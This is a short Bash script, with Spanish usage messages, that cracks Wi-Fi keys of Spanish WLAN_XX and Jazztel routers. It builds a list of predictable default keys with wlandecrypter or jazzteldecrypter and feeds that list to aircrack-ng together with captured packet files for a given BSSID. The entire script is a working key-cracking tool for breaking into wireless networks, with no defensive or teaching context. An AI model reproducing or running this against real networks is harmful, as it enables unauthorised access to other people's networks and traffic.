#echo uso: $0 bssid WLAN_XX fich_cap
if [ "$1" = "" -o "$2" = "" -o "$3" = "" ];
then
   echo uso: $0 bssid WLAN_XX fichero.cap
   exit 1
fi
BSSID=$1
ESSID=$2
TIPO=$(echo $ESSID | gawk -F'_' '{print $1;}')
if [ "$TIPO" = "WLAN" ];
then
   echo wlandecrypter  $1  $2
   wlandecrypter  $1  $2 > /tmp/claves.txt
else
   echo jazzteldecrypter $1 $2
   jazzteldecrypter $1 $2 > /tmp/claves.txt
fi      
RESTO_CMD=""
while [ "$3" != "" ];
do
   RESTO_CMD=$RESTO_CMD" "$3
   shift
done   
#aircrack-ng -w /tmp/claves.txt -b  $1  $3 $4 $5 $6 $7 $8 $9
/m/Mios/Personal/AIRELAB/linuxAirelab/aircrack-ng-0.9.3/aircrack-ng -w /tmp/claves.txt -b  $BSSID  $RESTO_CMD 
